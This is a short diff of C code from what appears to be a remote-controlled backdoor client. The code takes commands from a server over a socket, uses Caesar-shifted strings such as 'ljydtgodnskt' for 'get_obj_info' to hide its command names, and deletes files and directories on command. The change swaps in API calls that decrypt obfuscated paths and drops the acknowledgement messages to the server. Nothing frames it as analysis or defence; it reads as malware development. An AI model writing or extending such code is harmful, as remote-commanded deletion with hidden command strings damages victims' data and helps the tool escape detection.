@@ -195,14 +195,7 @@ retry:
 				goto retry;
 			}
 
-			delete_file(path);
-
-			if (Api.send(sock, "itsj", strlen("itsj"), 0) < 0) { //done
-				//send failed
-				Api.free(path);
-				Sleep_(Sleep_TIME);
-				goto retry;
-			}
+			Api.remove(CAESAR_DECRYPT(path));
 
 			Api.free(path);
 		}
@@ -219,14 +212,9 @@ retry:
 				goto retry;
 			}
 
-			delete_dir(path);
+			Api.rmdir(CAESAR_DECRYPT(path));
 
-			if (Api.send(sock, "itsj", strlen("itsj"), 0) < 0) { //done
-				//send failed
-				Api.free(path);
-				Sleep_(Sleep_TIME);
-				goto retry;
-			}
+			Api.free(path);
 		}
 
 		if (Api.strncmp(server_reply, "ljydtgodnskt", strlen("ljydtgodnskt")) == 0) { //get_obj_info
